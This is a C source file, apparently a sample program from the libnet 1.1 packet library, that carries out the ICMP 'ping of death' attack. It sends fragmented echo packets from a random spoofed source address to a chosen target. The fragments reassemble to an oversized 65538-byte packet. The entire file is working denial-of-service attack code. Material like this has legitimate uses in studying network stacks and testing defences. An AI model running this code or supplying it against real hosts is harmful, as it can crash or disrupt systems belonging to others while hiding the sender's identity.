/*
 *  $Id: ping_of_death.c,v 1.2 2004/01/03 20:31:01 mike Exp $
 *
 *  libnet 1.1
 *  ICMP ping of death attack
 *
 *  Copyright (c) 1998 - 2004 Mike D. Schiffman <mike@infonexus.com>
 *  All rights reserved.
 *
 *  Copyright (c) 1999 - 2001 Dug Song <dugsong@monkey.org>
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */

#if (HAVE_CONFIG_H)
#include "../include/config.h"
#endif
#include "./libnet_test.h"


#define FRAG_LEN    1472

int
main(int argc, char **argv)
{
    libnet_t *l;
    libnet_ptag_t ip;
    libnet_ptag_t icmp;
    struct libnet_stats ls;
    u_long fakesrc, target;
    u_char *data;
    int c, i, flags, offset, len;
    char errbuf[LIBNET_ERRBUF_SIZE];
  
    printf("libnet 1.1 Ping of Death[raw]\n"); 

    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
            LIBNET_RAW4,                            /* injection type */
            NULL,                                   /* network interface */
            errbuf);                                /* errbuf */
 
    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    if (argc != 2 || ((target = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE) == -1)))
    {
        fprintf(stderr, "Usage: %s <target>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    /* get random src addr. */
    libnet_seed_prand(l);
    fakesrc = libnet_get_prand(LIBNET_PRu32);
  
    data = malloc(FRAG_LEN);
    for (i = 0 ; i < FRAG_LEN ; i++)
    {
        /* fill it with something */
        data[i] = 0x3a;
    }

    ip   = LIBNET_PTAG_INITIALIZER;
    icmp = LIBNET_PTAG_INITIALIZER;

    for (i = 0 ; i < 65536 ; i += (LIBNET_ICMPV4_ECHO_H + FRAG_LEN))
    {
        offset = i;
        flags = 0;

        if (offset < 65120)
        {
            flags = IP_MF;
            len = FRAG_LEN;
        }
        else
        {
            /* for a total reconstructed length of 65538 bytes */
            len = 410;
        }

        icmp = libnet_build_icmpv4_echo(
            ICMP_ECHO,                                  /* type */
            0,                                          /* code */
            0,                                          /* checksum */
            666,                                        /* id */
            666,                                        /* sequence */
            data,                                       /* payload */
            len,                                        /* payload size */
            l,                                          /* libnet handle */
            icmp);                                      /* libnet ptag */
        if (icmp == -1)
        {
            fprintf(stderr, "Can't build ICMP header: %s\n", libnet_geterror(l));
            goto bad;
        }
        /* no reason to do this */
        libnet_toggle_checksum(l, icmp, 0); 

        ip = libnet_build_ipv4(
            LIBNET_IPV4_H + LIBNET_ICMPV4_ECHO_H + len, /* length */
            0,                                          /* TOS */
            666,                                        /* IP ID */
            flags | (offset >> 3),                      /* IP Frag */
            64,                                         /* TTL */
            IPPROTO_ICMP,                               /* protocol */
            0,                                          /* checksum */
            fakesrc,                                    /* source IP */
            target,                                     /* destination IP */
            NULL,                                       /* payload */
            0,                                          /* payload size */
            l,                                          /* libnet handle */
            ip);                                        /* libnet ptag */
        if (ip == -1)
        {
            fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
            goto bad;
        }

        c = libnet_write(l);
        if (c == -1)
        {
            fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
        }

        /* tcpdump-style jonks. */
        printf("%s > %s: (frag 666:%d@%d%s)\n", libnet_addr2name4(fakesrc,0),
                argv[1], LIBNET_ICMPV4_ECHO_H + len, offset, flags ? "+" : "");
    }

    libnet_stats(l, &ls);
    fprintf(stderr, "Packets sent:  %lld\n"
                    "Packet errors: %lld\n"
                    "Bytes written: %lld\n",
                    ls.packets_sent, ls.packet_errors, ls.bytes_written);
    libnet_destroy(l);
    free(data);
    return (EXIT_SUCCESS);
bad:
    libnet_destroy(l);
    free(data);
    return (EXIT_FAILURE);
}

/* EOF */
